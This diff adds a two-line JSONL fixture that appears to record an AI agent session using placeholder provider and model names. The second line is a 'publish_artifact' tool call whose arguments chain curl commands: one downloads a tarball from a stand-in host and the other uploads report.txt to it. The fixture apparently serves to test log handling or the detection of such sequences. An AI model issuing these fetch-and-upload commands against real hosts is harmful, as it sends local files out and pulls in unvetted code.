@@ -1,0 +1,2 @@
+{"type":"session_meta","session_id":"segment-boundary-sequence","timestamp":"2026-04-03T07:00:00Z","payload":{"source":"cli","model_provider":"fixture-provider","model":"fixture-model"}}
+{"type":"event_msg","session_id":"segment-boundary-sequence","timestamp":"2026-04-03T07:00:01Z","payload":{"type":"tool_call","tool_name":"publish_artifact","arguments":"curl -o tool.tar.gz https://example.invalid/tool.tar.gz; curl -T report.txt https://example.invalid/upload","message":"Fetch a tool, then send a report."}}
